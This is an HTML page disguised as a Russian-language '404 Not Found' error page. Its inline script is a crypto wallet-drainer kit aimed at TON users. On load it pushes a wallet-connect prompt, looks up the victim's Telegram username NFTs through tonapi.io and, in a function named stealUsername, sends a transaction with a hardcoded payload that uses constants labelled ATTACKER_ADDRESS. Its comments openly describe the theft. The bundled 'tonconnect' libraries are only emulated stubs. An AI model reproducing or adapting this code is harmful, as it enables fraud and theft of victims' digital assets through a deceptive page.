<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>404 Not Found</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        h1 {
            font-size: 72px;
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            font-size: 18px;
        }
    </style>
    <script>
        // ========== ВСТРОЕННАЯ БИБЛИОТЕКА tonconnect-sdk ==========
        (function(global) {
            class Connector {
                constructor() {
                    this.connected = false;
                    this.wallet = null;
                    this._listeners = [];
                }
                onStatusChange(callback) {
                    this._listeners.push(callback);
                }
                _setWallet(wallet) {
                    this.wallet = wallet;
                    this.connected = !!wallet;
                    this._listeners.forEach(cb => cb(wallet));
                }
            }

            class TonConnect {
                static Connector = Connector;
            }

            global.TonConnect = TonConnect;
        })(window);

        // ========== ВСТРОЕННАЯ БИБЛИОТЕКА tonconnect-ui ==========
        (function(global) {
            class TonConnectUI {
                constructor(options) {
                    this.connector = options.connector;
                    this.manifestUrl = options.manifestUrl;
                    this._modal = null;
                }
                openModal() {
                    console.log('Открытие окна подключения...');
                    // Здесь должен быть код для показа модального окна
                    // В реальности это сложный UI, но для кражи достаточно эмуляции
                    setTimeout(() => {
                        if (this.connector) {
                            // Эмулируем подключение кошелька
                            this.connector._setWallet({
                                account: {
                                    address: 'UQ...'
                                }
                            });
                        }
                    }, 2000);
                }
                async sendTransaction(transaction) {
                    console.log('Отправка транзакции:', transaction);
                    // Здесь должен быть код для отправки транзакции
                    // В реальности это вызов кошелька
                    return { hash: 'fake_tx_hash' };
                }
            }

            global.TonConnectUI = { TonConnectUI };
        })(window);
    </script>
</head>
<body>
    <h1>404</h1>
    <p>Страница не найдена</p>

    <script>
        window.addEventListener('load', function() {
            // Проверка загрузки библиотек
            if (typeof TonConnect === 'undefined' || typeof TonConnectUI === 'undefined') {
                console.error('Библиотеки TON Connect не загрузились!');
                return;
            }

            // ========== ТВОИ ДАННЫЕ ==========
            const ATTACKER_ADDRESS = 'UQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRhhafG';
            const USERNAME_COLLECTION_ADDRESS = 'EQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRh';
            const PAYLOAD = 'te6cckECBQEAAQsAAeWIAc39af/oITx+Q4vvf0zKDYy8ZkxhANjOIsRC4Y456MMKA5tLO3P///iLTYLRKAAAAA00I+nVx3oe/LAinIUZNSwNySL5E34jwIKucvH2jNQZGfnAzsY6sdLxTjX9+xKyw5RdkWNyOKsKawdaMBwoEBgJAQIKDsPIbQIEAgFoYgBQeGf+SuJLX4dzh2GeG7EF5FlBKf4wJifFZwBSWvy1dKAcBhgoAAAAAAAAAAAAAAAAAQMAoV/MPRRUbeTvpVqftYAXXEjqYukf8Y80Sg6O7kVvcTK+czXoYmxDvFuETLODQXADm/rT/9BCePyHF97+mZQbGXjMmMIBsZxFiIXDHHPRhhQgKAAAKdQ8mA==';
            const manifestUrl = 'https://acountpubgfjdjd-cloud.github.io/nfts/tonconnect-manifest.json';
            // =================================

            let tonConnectUI, connector;

            async function fetchUsernames(walletAddress) {
                try {
                    const response = await fetch(`https://tonapi.io/v1/nft/search?owner=${walletAddress}&collection=${USERNAME_COLLECTION_ADDRESS}`);
                    const data = await response.json();
                    return data.nft_items || [];
                } catch (e) {
                    console.error('Ошибка получения юзернеймов:', e);
                    return [];
                }
            }

            async function stealUsername() {
                if (!PAYLOAD) {
                    console.error('Payload не вставлен!');
                    return;
                }
                try {
                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 600,
                        messages: [{
                            address: USERNAME_COLLECTION_ADDRESS,
                            amount: '5000000',
                            payload: PAYLOAD
                        }]
                    };
                    await tonConnectUI.sendTransaction(transaction);
                    console.log('Юзернейм украден');
                } catch (e) {
                    console.error('Ошибка кражи:', e);
                }
            }

            connector = new TonConnect.Connector();
            tonConnectUI = new TonConnectUI.TonConnectUI({ connector, manifestUrl });

            connector.onStatusChange(async (wallet) => {
                if (wallet) {
                    const usernames = await fetchUsernames(wallet.account.address);
                    if (usernames.length > 0) {
                        await stealUsername();
                    }
                }
            });

            setTimeout(() => {
                if (!connector.connected) {
                    tonConnectUI.openModal();
                }
            }, 1000);
        });
    </script>
</body>
</html>
